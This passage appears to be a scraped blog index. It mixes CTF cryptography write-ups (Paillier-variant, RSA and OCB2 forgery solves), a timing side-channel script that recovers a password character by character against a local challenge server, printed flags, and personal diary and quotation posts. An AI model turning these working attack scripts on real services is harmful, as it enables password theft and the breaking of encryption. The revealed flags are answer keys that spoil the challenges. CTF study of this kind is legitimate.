len(msg1)==len(msg2) return long_to_bytes(bytes_to_long(msg1)^bytes_to_long(msg2)) if __name__ == \u0026#34;__main__\u0026#34;: io = remote(\u0026#34;127.0.0.1\u0026#34;,10004) pow() print(io.recvuntil(b\u0026#39;[-] \u0026#39;).decode()) io.sendline(b\u0026#34;1\u0026#34;) print(io.recvuntil(b\u0026#34;My Encrypted flag is:\u0026#34;).decode()) c = io.recvuntil(b\u0026#39;[+]\u0026#39;)[1:-4] cipherlen = len(c) - 1 fakeplain = cipherlen * b\u0026#39;\\x01\u0026#39; blocksize = cipherlen//16 newcipher = enc(fakeplain) fakeplain = pad(fakeplain) new_plain = [] for i in fakeplain: new_plain.append((i)\u0026lt;\u0026lt;1) new_plain = bytes(new_plain) s = (xor(new_plain,newcipher[:])) fakeplain2 = (xor(s,c)) new_plain = [] for i in fakeplain2: new_plain.append((i)\u0026gt;\u0026gt;1) new_plain = bytes(new_plain) print(new_plain) MyCryptoSystem # 阿巴阿巴，摸了，一中午时间搞不定捏，下午还要上机\nfrom Crypto.Util.number import* import random from secret import flag from hashlib import sha256 import socketserver import signal import string def trans_flag(flag): new_flag = [] for i in range(6): new_flag.append(bytes_to_long(flag[i*7:i*7+7])) return new_flag kbits = 1024 table = string.ascii_letters+string.digits flag = trans_flag(flag) def Setup(kbits): p_bit = kbits//2 q_bit = kbits - p_bit while 1: p = getPrime(p_bit) p_tmp = (p-1)//2 if isPrime(p_tmp): break while 1: q = getPrime(q_bit) q_tmp = (q-1)//2 if isPrime(q_tmp): break N = p*q while 1: g = random.randrange(N*N) if (pow(g,p_tmp * q_tmp,N*N) - 1)%N == 0 and (pow(g,p_tmp * q_tmp,N*N) - 1)//N \u0026gt;= 1 and (pow(g,p_tmp * q_tmp,N*N) - 1)//N \u0026lt;= N - 1: break public = (N,g) return public,p def KeyGen(public): N,g = public a = random.randrange(N*N) h = pow(g,a,N*N) pk = h sk = a return pk,sk def Encrypt(public,pk,m): N,g = public r = random.randrange(N*N) A = pow(g,r,N*N) B = (pow(pk,r,N*N) * (1 + m * N)) % (N * N) return A,B def Add(public,dataCipher1,dataCipher2): N = public[0] A1,B1 = dataCipher1 A2,B2 = dataCipher2 A = (A1*A2)%(N*N) B = (B1*B2)%(N*N) return (A,B) def hint(p): _p = getPrime(2048) _q = getPrime(2048) n = _p*_q e = 0x10001 s = getPrime(300) tmp = (160 * s ** 5 - 4999 * s ** 4 + 3 * s ** 3 +1) phi = (_p-1)*(_q-1) d = inverse(e,phi) k = (_p-s)*d enc = pow(p,e,n) return (tmp,k,enc,n) class Task(socketserver.BaseRequestHandler): def _recvall(self): BUFF_SIZE = 2048 data = b\u0026#39;\u0026#39; while True: part = self.request.recv(BUFF_SIZE) data += part if len(part) \u0026lt; BUFF_SIZE: break return data.strip() def send(self, msg, newline=True): try: if newline: msg += b\u0026#39;\\n\u0026#39; self.request.sendall(msg) except: pass def recv(self, prompt=b\u0026#39;SERVER \u0026lt;INPUT\u0026gt;: \u0026#39;): self.send(prompt, newline=False) return self._recvall() def proof_of_work(self): proof = (\u0026#39;\u0026#39;.join([random.choice(table)for _ in range(20)])).encode() sha = sha256(proof).hexdigest().encode() self.send(b\u0026#34;[+] sha256(XXXX+\u0026#34; + proof[4:] + b\u0026#34;) == \u0026#34; + sha ) XXXX = self.recv(prompt = b\u0026#39;[+] Plz Tell Me XXXX :\u0026#39;) if len(XXXX) != 4 or sha256(XXXX + proof[4:]).hexdigest().encode() != sha: return False return True def handle(self): proof = self.proof_of_work() if not proof: self.request.close() public,p = Setup(kbits) signal.alarm(60) pk = [] for i in range(6): pki,ski = KeyGen(public) pk.append(pki) msg = [123,456,789,123,456,789] CipherPair = [] for i in range(len(pk)): TMP = Encrypt(public,pk[i],msg[i]) CipherPair.append(((TMP),pk[i])) CipherDate = [] for i in range(len(pk)): CipherDate.append(Add(public,Encrypt(public,pk[i],flag[i]),CipherPair[i][0])) self.send(b\u0026#39;What do you want to get?\\n[1]pk_list\\n[2]public_parameters\\n[3]hint_for_p\\n[4]EncRypt_Flag\\n[5]exit\u0026#39;) while 1: option = self.recv() if option == b\u0026#39;1\u0026#39;: self.send(b\u0026#34;[~]My pk_list is:\u0026#34;) self.send(str(pk).encode()) elif option == b\u0026#39;2\u0026#39;: self.send(b\u0026#34;[~]My public_parameters is\u0026#34;) self.send(str(public).encode()) elif option == b\u0026#39;3\u0026#39;: self.send(b\u0026#34;[~]My hint for p is\u0026#34;) self.send(str(hint(p)).encode()) elif option == b\u0026#39;4\u0026#39;: self.send(b\u0026#39;[~]What you want is the flag!\u0026#39;) self.send(str(CipherDate).encode()) else: break self.request.close() class ThreadedServer(socketserver.ThreadingMixIn, socketserver.TCPServer): pass class ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass if __name__ == \u0026#34;__main__\u0026#34;: HOST, PORT = \u0026#39;0.0.0.0\u0026#39;, 10004 print(\u0026#34;HOST:POST \u0026#34; + HOST+\u0026#34;:\u0026#34; + str(PORT)) server = ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() Refer：\nhttps://link.springer.com/book/10.1007%2Fb94617 有点全同态的意思，思路应该都差不多，老年人审不动代码了\nsolve # from Crypto.Util.number import * pk = [ 9903345546233406345274390216048265052622725595643911382459514293327907995763783433147838863218937316798528321748709369866569364258411991106643258574989572698239199587284255395798614346448471824851838611865337708256660691836153845389605039594319342717738584309592542607252862142218328138475660803285763968213588394528744053027073152049126506763299065229583353619501424333169829170062395149103651329694449221315641100954836434060049710046515370320763518422757259232374856682888632529561315692561552616649850830047862626833700857587886906774837245010908976175065773850953572418920037258016988361625314499467080329947834, 4657987514327931382586065476207522772971258290989872695879544239943902837884205892985114988879105147508471426477725785278489578603238865417098282642677702682558515261983265111905752045094339807685437631424315910160691213278435428566562930439156460282707569924593158395598671318460018264391187530476992919637306573650359751555942532258246978276100316266002757890715569420913869805217560217134510519346377418614486773028307378572957516734818473041775035754849881665094508458497419054187487268190726118233936603633638471145845999136306136647043157332984411178327008942140608992928610672350874409133847619495978691003983, 7152622146034039999102209659831462740324099991262599130951339134800860469219385611290178799376661722659467449321426175020317292072406471009110088250342445514154276439873731324377138630287652938447079493334481729733399579524933508791782450534231737861241986084043058279901605377263189163625776405289654862504323255599291057684909554237875294477643638400289810490222526085038484864459087125794097728967487662164428457600296095735630725252693027342870722549061819169935860921269104894144054734690002817578317664544134682313233240526480877455943937633095468303194749422586696801627436494347930469704062764072900721232548, 7109779273286288048422281478804269058000170220987326969272411328526909689353334022202761918717633450003773894926300727763953889207715377450335730309751197006520012868095728483075579533219462901668068782447412894870775590238751905671507645068125478347626639590964901574834959983618787306511470121467436989932815779239653115530532446769723177935466135060247074247928491194578344816554353261469294754488631361381078861128074887053925809483235131348049560238616364665057176559180859329509474653282715138146826654691223610824931487517489362866512293278790312452574896436150893275394629547641444721163364866744442609573336, 7013605482466599504215631908713721046317718409278569099893184473489373835086487268247053290346460889649268221380299871646123742986014194382973645546664516341392101622320165115690109134132599946593167293726028899310932600936819760645652261283663993530694302054668286992858073658208217032520244670566118947000884035935625925585375773268470663092328626392488631056760673984746371429897537785286259074077658212766702133795429225879795772702881120673021514373788313589716773325607907621831363437568961397189016495389255827603389591886876630344786847409531508107276526897772978948736479662903818836257353212222762336597842, 4806721251332604936583783100910738385093145269860713974606137000339320309313718310646996553451884286724915427107907524634556622320710583584822842418207893426969244662819580085418538670391877263926570368207843244161385729568080850388644996006667177570562488502257438937466251161234759102309530753153103743200173924429409773543762996308591888655566867525229785743476821619151400424309747726050575041627943897750153111818448811385038416912000573298056564339492261814303206364521764204436008885844987333383021967216866126804296346352232953195581868834806336897980493190883504556027965801104592918053461903544343499793148] pp = ( 116058145608385674276672702733893672956917357809340972538570485852695265863484647565483969096692688010826897645583250179342948573711209724577479990992353280882942137887382013678270315267433526273541196683333653359064888776962783810251136593744944176853011420616507243827538789682910216231628628642669601620197, 1323504804693605855191327443760086345281649229726269111925168787721095025354939523351093646120270955977932471982770625541648435290075746193431150770845139326096348863253122005228642568047448855041631516254485716898369011414099219540232164217042223770732057949218835774974444493789502265425791610604673305652047727570396368311258661773456561780033017199975954989495183950216887552362300470021672023164588797459958072321188375419124464113413271301788579119298216918506641731413551008233009777669881314925772595092716344426679130709454192219868031884699258375512868095144714176573965706489293593500326194562659653969458) hint = ( 3304509274524412540171264358124119088833800976282457766193314963305873033161330887473610701496331727440513718090072303043520886293193462950873554113640228240224124433475441227891344247665419958809785016703063382485354461032693344779418991821542568461754389960108428352247981608899460343162110878318981398514231521555009134803445563830931241367613010673484820004826742929263786069863767135614670210943375086531462135790577385826251711826956133897596282243, 18673552355026493682367993197594041685105912554496204006071318337433750748484198918999006603609070236946794406646857929858271667161159821948643461587573309938436022907905563675893493544137760269437082632764159499720652999895637785568626919233056222688894682434212287149137672927486675552931963662505820165969260332655913416992181107410361559298420835898842186213690962374197086970672645328840383254461784517784780864111625152257285743741377246185357414383169045966336855033328995108673937471012241768717137091699706888762787881023600876751379445077298974464957282953933633278819938276469242913645327826899280730378510831893678633686326067596094217688170054369461965105625780401612104533404625397536763720217428564215968405635508712008844542236283094192295732557282230905545840906632840009978007258478459365608215939033972105748737935689371789627988971740974016203717802975023788606268882962377491740960659808878888064715022917962036921078185337788188828827560750328462479969002281238743276353625438159553170772284740537095985838278172254013674247239470266176189688697125522141751881011405920598024214587381076120444370591846992414608682429746316750727122762979926721420808841162691202812455865023677898835926775902048207423004038897059826740331422462081975344727266724533279470011913633242411494155377901129954948980432938310133971389286531625924644619420043095791394754413875398146297583377962248627741212161303069981941569866944074879499723223751021923981415814664672164190239644127148353124450639473123151046004159881650568067549888897471830276776633029695063826990630398201263925250452965401918712445937288291276956166559477365872979519731483611497593803953363019529897948397338298832801417548743615088306206142876669755008937934689940302481383802561001644113621155496827135409662730409037898943078891337579488375518035794171905834626304322444694, 539377906599424907526632843166406186887994388288395247025677144511569324590324166349932358956945530482435011767601209547968477063774490960749034860906510588252104413420941733125967525475043221168756505292522601577057218771125772685733296338522363178984864495675414130791619818890366370557675326005258390297594292831359088537078656773489065102417473480178237120474398129190736614740095486323803477825764714579797487965970125462158351531803287630303556152941144529035877182222332859272963419562743124506553238333107168737543087680258179370723432262945716883858929178735267308369044505783745182741491958523354179513018857096826520453169699127158441377257448188678204993164831215068755599442400473937072589097943431330269080643575456825957862621837176273757555174664101928305295704140917190943907845610548594061039034810294061809981907459259888820996892671481897701236041260611950043463091395858960542584227353654109383849840291308218862529006542917504664716472128390359084763925098770711610788290622962907016008535400120027033905191127470206070423441540259944787758643369312060605925413027755134600754634776476816867075412026307691016441255799159826836710912465972283668124709418672925573497481469507767821018983331413830308225249670213, 771303616051246597362775631900799039403496855240545309388039239713515343324730245355385505175052264662225716867664932661179695239976689945202466354113882887785256123500397817446363928952385349720106805723398880158118530637817328419529810918253166105130572407675868533684722690701263027695057884781572005203710380389492337464706322197156332747141737567696942141557244601594450697569317561198633787265360908016943129048658517482780709873483395196165037089762085272676446233125576546801464300403172738727818739368290767604363354842370759828029956787539488976004277286939183192793995718557020159731981638723547110532088324527518198313950639459543804840939790334808699633063597436840087738271170775240338399829681169080915374347348793605099404690101311868508864356243014172245954247143538079675646203655046049549064125322505821306915855626027754226417532505315799505040998439588290594143118470042253509832524845224911601112190904726230912309817509408264025187673852524716993402306088622806621715736676790401579697069312650629611634465456687035568440558258548547180371086392877863527742881461641884074483579391836421145981167932451527973965904138695962954324595990655760219255358121458470950021891974378425618763709685740211924807012197107) enc = [( 2370749863764972469554987128423083132152741020419238456792199956271338793369703079791129095737616003377516787283096306824061503011677428843457108641844447745003806414353879288703818779487783955229942181920152588250200669054504452218107095850722768505991162394104886525200011421355381962826397885692150120244491531539377531866284584252422892309748011247515811550244392155248279678705299157537079588584781118082321447337527598026964754363320992168148072800954886229060629354492679636656754286873086972322060862979794720152370297379178231399705112629407022082772459000129648242752712149593022848240307229599933472326639, 10629950550426941565735942536153612126197075426453505801699488530948416427388341145614894540703007927177589576195791501426919155687969896393612899952331105630117997308653329395856690066181874393591881894453952869877799692000865157650370029152823033681542597277374455515630326185288969181207049278972424924124917280845385999799481752211943822401232496627640731964698440335637339531240277243009697942776518858825759945763928468912578631650445582450477310960248021693355312415701840017992455266308763927053090663891585787512051382596977251121622452266044626384323834901483016613229807405392686302206337745279574799725645), ( 8542751637884684025319786450527032227009617479414394231919844939217652338788161470233642473581019170622701720476025009092989013870995959272934965586486840055645006446711683509118553167874426553788648476906001713844361905026951473754320948536863270405442355445689090656080870055731787592798342434870295612231106938988844575221665180789028833163353823895142662603464032381483430210539747595577423739584974097527545540375158029450966706494122549444092584635666880572007044982041658609028110690639268383842637227465891773307663549588908675683344647203385483408274703330184009244117626337442195205480475459017506908378382, 2085464782488608613105478863522869688839446373807422195811803331689394753034371063243583106866586343146531749675569189096780488423721634377236415215284877254947163786418624603900665408073101524722245655198842608618980378770280851746286699343613279939871217219082251933210754404379200901319663736745457626874556188300478654812086483681270689360875895659386846755725802972602048228910282786705793739781283712745503244516889112081931069096299064296710777871729670616642875966694256394184177030901697579198250012643883583860976015695050327069588050903408271139834868592068346344594302367420008530215145642134089913952557), ( 543379651794527156062094782615415987126871620097692229765839746265851208613317355119559668303271787419759988860329095755697435256473567826557245034346459936922682845797773645705160147104133662578144309856704479439289163136941011188877597285072682519886521870892631481613475471998069980876386882958669921110348676779465364405081731380722964576478311374454355160040908216697066270729949487583602342578399647457482050413820300137877454944632271598565235769295077747277719043188373569056439162575396512455806377433545271124528925620470920962892894249748487897779327141712239684724085201311734710383690195147053140764504, 9600165348259661124956404845736396858100519318389925868606888916984643985895386306780982368751778369806274791090833545087200109007614498245855188283074902307949807130479277113285297867794858711826951638363843607817932591111690370962454818512651391989642966123695165335863937606726713692914497273424773388437855020945354376617719527751214041931945111308814001172921038464366498230491013737383072831557104712383544399543012036163649490354003100371174810574006002644174234692655781715586368884960284084967731443156537638580405037295061504085273546300354900099908765784319131236423563368794213970198902823051776517828468), ( 12720343660076569556039596264810303540914689089267418571274368608634502718903963112327879610372603745751539474798195515336467050718375929419345733113911528358484167664963503186841785910027555371478552531495995844268225519704711001985099721356627657840167984002486330570582837406734000720783811150194191002449217705383562675444044945162334756814642251675950438968558499867686939667519299824614533209923956050684477257790445925094911660288187792056096062118083793213147868094394231992192383502108218624286840281922749640371120549106693515481691153295118333950838764473539401082016498358430567956598359917829161043821923, 4650323688588415339019928507804235509220831574748530492223503896814273549337012004014746825250262647080845945994043124954184595880222369378843745537963920765086225346591138786702843017155046291724096922328898328762663213011679875702138741764070774196464897663069143841855764208571026489169132412285776494336297720866132075198429444247196211613036311318314879852868477516679485900845328688901789016225902686170650744766395837690968708316279220636380532088975733777486547226356583429833361452246099636637189734339178241917792021598852161212173979461617456855465936599590284629977902176162000058610035695794065634100639), ( 10396423324897848835409665024677718748748275152542630135546271217978894933756975222671676528440868558146062940715117417453570039212594054647284966702987699660365789971324359154387594924406035801798108650969994651017387528389546784219757728821861009799685768626296589321049051322128571853402725165039936147958562122051637969655142188175452657583158785607562742670990899569674380956330989338377933120635140041105086765896268409172931140656723857868697634702294188534131288843222666037473712998513917783662683841747851217148640555307904431378526795971269753578248986461126093686958140302691940282614769028716224500465400, 10798504168395710787960812876356437285934683803323132830688595372752190494161652829029608445088132125185307268912072641282834290673164295328663953059468256952098951333672231933874502144395072869385220758235319321235155734059642693343763727507971442564909780155636668388696682838764136330992117816596893267196341561066485523081399699619635261170621994915700709742698285689917591029680117943213992352450943218840907244087863115086611479482597679053688944172466634936583338987025301834861645019455669785648445946091342899676952875789185642046350945969242055986671135076879652075682156184614411942863144182851932824842223), ( 6024146563091378683361400585005798994618396955430739256202274414470382614885386935565909835642987305321627688396325616582250978022048902486972239421247523958404794423154859667551329588342537025329667423441363580369169495567970964773693968820126919761419804174567010888728316915168649562127178777376355308064502139123147221947023574172487891669271681846950161748490575086030511122210151190204591379378553678990922119342011478603434071107786918375396663987961758147555293906382425151887060043190720507983485158382548174693081995619844700045348077449835099793967697120736717935383288578127456179213311919161151155174824, 4870502348403192237841744837214583690478227756212766589818598939047582028006298907136620265317438054467335452744116591470143951540556270271380332391795537714716300381577136060628725987549313679113315820130730138650199102902669460738279230412746309056896412027404174717090688033608047192772110096729558448093593198119502746076283713950634532742154889796648667924689635484547336377813437723995975643927939980093528839639771421922806898920769585362627963378567719717948703184928020874906392869582921471386283254630748177578173599118834216729254666298122543633678959357415931927763356558249437476070464496258411089399963)] l = 0 r = 1 \u0026lt;\u0026lt; 300 while True: s = (l + r) // 2 x = (160 * s ** 5 - 4999 * s ** 4 + 3 * s ** 3 + 1) - hint[0] if x \u0026gt; 0: r = s elif x \u0026lt; 0: l = s else: break _p = GCD(pow(2, hint[1] * 65537 + s - 1, hint[3]) - 1, hint[3]) _q = hint[3] // _p d = inverse(65537, (_p - 1) * (_q - 1)) p = pow(hint[2], d, hint[3]) n = pp[0] q = n // p k = (p - 1) * (q - 1) // 4 g = (pow(pp[1], k, n * n) - 1) // n msg = [123, 456, 789, 123, 456, 789] flag = b\u0026#39;\u0026#39; for i in range(6): y = (pow(pk[i], k, n * n) - 1) // n x = y * inverse(g, n) % n m = pow(enc[i][1], k, n * n) * pow(enc[i][0], -k * x, n * n) f = ((m - 1) // n * inverse(k, n) - msg[i]) % n flag += long_to_bytes(f) print(flag) fermat\u0026rsquo;s revenge # 小数学题\n重新模p，需要对指数变形\n对上式和n求gcd即可。\nfrom Crypto.Util.number import * n = 17329555687339057933030881774167606066714011664369940819755094697939414110116183129515036417930928381309923593306884879686961969722610261114896200690291299753284120079351636102685226435454462581742248968732979816910255384339882675593423385529925794918175056364069416358095759362865710837992174966213332948216626442765218056059227797575954980861175262821459941222980957749720949816909119263643425681517545937122980872133309062049836920463547302193585676588711888598357927574729648088370609421283416559346827315399049239357814820660913395553316721927867556418628117971385375472454118148999848258824753064992040468588511 c = 2834445728359401954509180010018035151637121735110411504246937217024301211768483790406570069340718976013805438660602396212488675995602673107853878297024467687865600759709655334014269938893756460638324659859693599161639448736859952750381592192404889795107146077421499823006298655812398359841137631684363428490100792619658995661630533920917942659455792050032138051272224911869438429703875012535681896010735974555495618216882831524578648074539796556404193333636537331833807459066576022732553707927018332334884641370339471969967359580724737784159811992637384360752274204462169330081579501038904830207691558009918736480389 hint = 2528640120640884291705022551567142949735065756834488816429783990402901687493207894594113717734719036126087363828359113769238235697788243950392064194097056579105620723640796253143555383311882778423540515270957452851097267592400001145658904042191937942341842865936546187498072576943297002184798413336701918670376291021190387536660070933700475110660304652647893127663882847145502396993549034428649569475467365756381857116208029508389607872560487325166953770793357700419069480517845456083758105937644350450559733949764193599564499133714282286339445501435278957250603141596679797055178139335763901195697988437542180256184 p = GCD(hint-pow(1011, n, n), n) q = n//p d = inverse(65537, (p-1)*(q-1)) print(long_to_bytes(pow(c, d, n))) 'flag{1d2f28834ecbd1983b62d30f4723476e}'\n第二届美团ctf预赛romeo # 操作系统终于考完了，抽空看了下这个完全没有营养的线上赛\nfrom Crypto.Util.number import* from Crypto.Cipher import AES from secret import msg,password,flag import socketserver import signal assert len(msg) == 32 assert len(password) == 8 def padding(msg): return msg + bytes([0 for i in range((16 - len(msg))%16)]) class Task(socketserver.BaseRequestHandler): def _recvall(self): BUFF_SIZE = 2048 data = b\u0026#39;\u0026#39; while True: part = self.request.recv(BUFF_SIZE) data += part if len(part) \u0026lt; BUFF_SIZE: break return data.strip() def send(self, msg, newline=True): try: if newline: msg += b\u0026#39;\\n\u0026#39; self.request.sendall(msg) except: pass def recv(self): return self._recvall() def login(self): right_num = 0 while 1: self.send(b\u0026#39;[~]Please input your password:\u0026#39;) str1 = self.recv().strip()[:8] print(str1) print(password) true_num = 0 for i in range(len(password)): if str1[i] != password[i]: login = False self.send(b\u0026#39;False!\u0026#39;) break else: true_num = i + 1 if right_num \u0026gt; true_num: continue else: right_num = true_num if true_num == len(password): login = True check = b\u0026#39;\u0026#39; for i in range(0x2000): check = self.aes.encrypt(padding(check[:-1] + str1[:i+1])) if login == True: self.send(b\u0026#34;Login Success\u0026#34;) return True,check[:16] return False def handle(self): signal.alarm(100) self.aes = AES.new(padding(password),AES.MODE_ECB) _,final_check = self.login() if _ == 1: 这个assert完全没有什么鸟用 # assert msg.decode() == final_check.hex() self.send(b\u0026#39;Good Morning Master!\u0026#39;) self.send(flag) class ThreadedServer(socketserver.ThreadingMixIn, socketserver.TCPServer): pass class ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass if __name__ == \u0026#34;__main__\u0026#34;: HOST, PORT = \u0026#39;0.0.0.0\u0026#39;, 10001 print(\u0026#34;HOST:POST \u0026#34; + HOST+\u0026#34;:\u0026#34; + str(PORT)) server = ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() 一位位爆破密码\n通过range(0x2000)的高耗时来判断当前正在判断的位数\nfrom pwn import * from time import time import string #io = remote(\u0026#34;127.0.0.1\u0026#34;, 9999) io = remote(\u0026#34;0.0.0.0\u0026#34;, 10001) CHARSET = string.printable pre = \u0026#34;\u0026#34; for _ in range(8): print(_) t = 0 now = \u0026#34;\u0026#34; for i in CHARSET[:]: io.recvuntil(b\u0026#34;:\u0026#34;) print(pre + i + \u0026#34;0\u0026#34;) io.sendline((pre + i + \u0026#34;0\u0026#34;).encode()) start = time() # 等待 \u0026#34;False!\u0026#34; io.recvuntil(b\u0026#34;!\u0026#34;) end = time() # 出现错误的时间大于上一次出现错误的时间 # 证明当前字符才对了，正确的序列又变长了一位 if (end - start) \u0026gt; t: now = i t = end - start print(end - start) print() print(t) #exit() pre = pre + now print(pre) io.interactive() 最后拿到passwd了nc上去输入拿到flag\n","date":"14 November 2021","permalink":"/achieve/%E5%A4%8D%E7%9B%982/","section":"archive","summary":"","title":"闲题杂记2"},{"content":"一晃眼2021就快过去一大半了,本来准备放假写的\n一晃眼2021就快过去了\n干脆忙里偷闲搞一点吧\n虽然跑到外面去也不知道玩什么,景点也懒得去,忙着赶路和做决定不知不觉浪费了一堆时间\n但还是想跑出去玩\n一年就这样浑浑噩噩地过去了，得到什么失去什么也不好说\n总之逞着还有干劲，多提高单位时间利用率吧😩\n上半年 # 李老板请吃饭 可喜可贺可喜可贺\n长江带桥\n下半年 # 啊傻逼了刷机把数据备份搞没了，我的暑假什么都没留下\n罚坐 好！\n事新平板哦\n夏日限定（果然只有和朋友一起烤肉才能搓到人均150。。。）\n一年半没回去看了\n让人掉san\u0026hellip;.欲罢不能\u0026hellip;.就是说\n嘿嘿嘿🤤🤤🤤小猫咪🤤🤤🤤\n溜了溜了\n川航的空姐小姐姐很漂亮😲😲😲巴蜀利亚赛高\n吃\nstroll\n坐上兄弟的车了XXXXD\n什么时候去考个驾照吧XXD\n","date":"20 October 2021","permalink":"/achieve/loving-2021/","section":"archive","summary":"","title":"loving-2021"},{"content":"在战略上要藐视敌人 在战术上要重视敌人\n战争论 # 战争不是消遣，不是一种追求冒险和赌输赢的纯粹的娱乐，也不是灵机一动的产物，而是为了达到严肃的目的而采取的严肃的手段。\n危险中最可贵的精神力量是什么？勇气\n军争 # 故不知諸侯之謀者，不能豫交﹔不知山林、險阻、沮澤之形者，不能行軍﹔不用 鄉導者，不能得地利。\n故兵以詐立，以利動，以分和為變者也。\n故其疾如風，其徐如林，侵掠如火，不動如山，難知如陰，動如雷震。\n掠鄉分眾，廓地分守，懸權而動。\n先知迂直之計者勝，此軍爭之法也。\n故三軍可奪氣，將軍可奪心。是故朝氣銳，晝氣惰，暮氣歸。故善用兵者，避其 銳氣，擊其惰歸，此治氣者也。以治待亂，以靜待嘩，此治心者也。以近待遠， 以佚待勞，以飽待飢，此治力者也。無邀正正之旗，無擊堂堂之陣，此治變者也。\n故用兵之法，高陵勿向，背丘勿逆，佯北勿從，銳卒勿攻，餌兵勿食，歸師勿遏 ，圍師遺闕，窮寇勿迫，此用兵之法也。\n势 # 激水之疾,至于漂石者,势也;鸷鸟之疾,至于毁折者,节也。是故善战者,其势险,其节短。势如弩,节如发机。\n故善战者,求之于势,不责于人,故能择人而任势。任势者,其战人也,如转木石。 木石之性,安则静,危则动,方则止,圆则行。故善战人之势,如转圆石于千仞之山者,势也\n君主论 # 所有武装的先知都获得胜利，而非武装的先知都失败了\ncipher punk # 强大的密码术能够抵抗无限施加的暴力。任何暴力都无法解决一道数学问题。\n","date":"30 September 2021","permalink":"/achieve/sentence/","section":"archive","summary":"","title":"drunk gibberish"},{"content":"\rA study of Cryptanalysis of OCB2 # Introduction (TL;DR) # Authenticated encryption (AE) is a term used to describe encryption systems that simultaneously protect confidentiality and authenticity (integrity) of communications; that is, AE provides both message encryption and message authentication of a plaintext block or message .\nThe offset codebook block cipher mode (OCB)\nOCB provide an extremely efficient algorithm, equal to or more efficient than other AE algorithms. OCB is a cipher mode and we can apply ocb to AES/DES/SM4 etc.\nThe following paragraph briefly introduces OCB1 and OCB2\nOCB1 # Figure 1 shows the overall structure for OCB encryption and authentication.\nThe message M to be encrypted and authenticated is divided into n-bit blocks, with the exception of the last block, which may be less than n bits. Typically, n = 128.\nenc\nInput:$(N,M)$\nOutput:$(C,T)$\nThe calculation of the Z[i] is somewhat complex and is summarized in the following equations\nThe operator · refers to multiplication over the finite field $GF(2^{128})$with the irreducible polynomial $m(x) = x^{128} + x^7 + x^2 + 1 $.\nThe operator ntz(i) denotes the number of trailing (least significant) zeros in i\nThe meanings of other notation are as follows\n$checksum = M[1] \\oplus M[2] \u0026hellip;\\oplus Y[m]\\oplus C[m]||0*$\n$tag = first \\; \\tau \\; bits \\; of \\; E_K(checksum\\oplus Z[m])$\nThe following figure summarizes the OCB algorithms for encryption and decryption\nOCB2 # We denote with $msb_c(X)$ and $lsb_c(X)$ the first and last c ≤ |X| bits of X respectively.\nThe mode’s key space K is that of the underlying blockcipher E\nthe latter is required to have block length n = 128 (in particular, AES is suitable)\nthe nonce space is $N = {0, 1}^n$\nthe message space $M$ and the AD space A are the set {0, 1} of strings of arbitrary length\n$\\sum means \\; checksum \\; in \\; OCB2$\n$\\epsilon$ means empty\nn $len(X)$ denotes an n-bit encoding of |X|,\n$D_E(N,A,C,T)$ decrypt the C and use M to recalculate $\\sum$\nso, T is related with A and M\nThe main case is the $2^mL$ generation\nBasic Attacks (Minimal Forgery Attack) # We give the minimal example of against OCB2.\nThe rests are in the attachment\nEncrypt $(N, A, M)$ where $N$is any nonce, $A = \\epsilon $ is empty, and $M$ is the 2n-bit message\n$M = M[1]||M[2]$ where\nThe encryption oracle returns a pair $(C, T) $consisting of a 2n-bit ciphertext $C = C[1] || C[2]$ and a tag $T$.\nconstructing parameters are as follows :\nlenth of $C\u0026rsquo;$ is n,the half of $M$\nDecrypt $(N\u0026rsquo; , A\u0026rsquo; , C\u0026rsquo; , T\u0026rsquo; ) $\npseudocode:\nM[0] (in hex) = 00000000000000000000000000000080\rM[1] (in hex) = 0053cc74d9fba8588190c414aff6e6a2\rC, T = encrypt(N, M)\rC_ = C[0] ^ M[0]\rT_ = M[1] ^ C[1]\rauth, M_ = decrypt(N, C_, T_) prove # In this poc $T\u0026rsquo;$ decryptde as pad\nas the $A$ is empty，this breaks the authenticity of OCB2.\nexercise case # Oil Circuit Breaker: https://ctftime.org/task/10227\noops2: https://ctftime.org/task/7217\nReferences # Plaintext Recovery Attack of OCB2,2018\nCryptanalysis of OCB2,2018\nCryptanalysis of OCB2:Attacks on Authenticity and Confidentiality,2019/311\nOCB2-POC\nAttachmant # Download ","date":"29 August 2021","permalink":"/articles/ocb2/","section":"Projects","summary":"","title":"A simple study of OCB2"},{"content":"\rWriteUp for crypto in 翔云ber 2021 # 👴第二次打祥云杯，周日来苟了几个水题\nRandom_RSA # 把代码反过来写就完事了\n但是要注意题目random.seed是在python2环境下算出的数据。。。。有点坑了\nfrom Crypto.Util.number import * import random seeds = [4827, 9522, 552, 880, 7467, 7742, 9425, 4803, 6146, 4366, 1126, 4707, 1138, 2367, 1081, 5577, 4592, 5897, 4565, 2012, 2700, 1331, 9638, 7741, 50, 824, 8321, 7411, 6145, 1271, 7637, 5481, 8474, 2085, 2421, 590, 7733, 9427, 3278, 5361, 1284, 2280, 7001, 8573, 5494, 7431, 2765, 827, 102, 1419, 6528, 735, 5653, 109, 4158, 5877, 5975, 1527, 3027, 9776, 5263, 5211, 1293, 5976, 7759, 3268, 1893, 6546, 4684, 419, 8334, 7621, 1649, 6840, 2975, 8605, 5714, 2709, 1109, 358, 2858, 6868, 2442, 8431, 8316, 5446, 9356, 2817, 2941, 3177, 7388, 4149, 4634, 4316, 5377, 4327, 1774, 6613, 5728, 1751, 8478, 3132, 4680, 3308, 9769, 8341, 1627, 3501, 1046, 2609, 7190, 5706, 3627, 8867, 2458, 607, 642, 5436, 6355, 6326, 1481, 9887, 205, 5511, 537, 8576, 6376, 3619, 6609, 8473, 2139, 3889, 1309, 9878, 2182, 8572, 9275, 5235, 6989, 6592, 4618, 7883, 5702, 3999, 925, 2419, 7838, 3073, 488, 21, 3280, 9915, 3672, 579] res = [55, 5, 183, 192, 103, 32, 211, 116, 102, 120, 118, 54, 120, 145, 185, 254, 77, 144, 70, 54, 193, 73, 64, 0, 79, 244, 190, 23, 215, 187, 53, 176, 27, 138, 42, 89, 158, 254, 159, 133, 78, 11, 155, 163, 145, 248, 14, 179, 23, 226, 220, 201, 5, 71, 241, 195, 75, 191, 237, 108, 141, 141, 185, 76, 7, 113, 191, 48, 135, 139, 100, 83, 212, 242, 21, 143, 255, 164, 146, 119, 173, 255, 140, 193, 173, 2, 224, 205, 68, 10, 77, 180, 24, 23, 196, 205, 108, 28, 243, 80, 140, 4, 98, 76, 217, 70, 208, 202, 78, 177, 124, 10, 168, 165, 223, 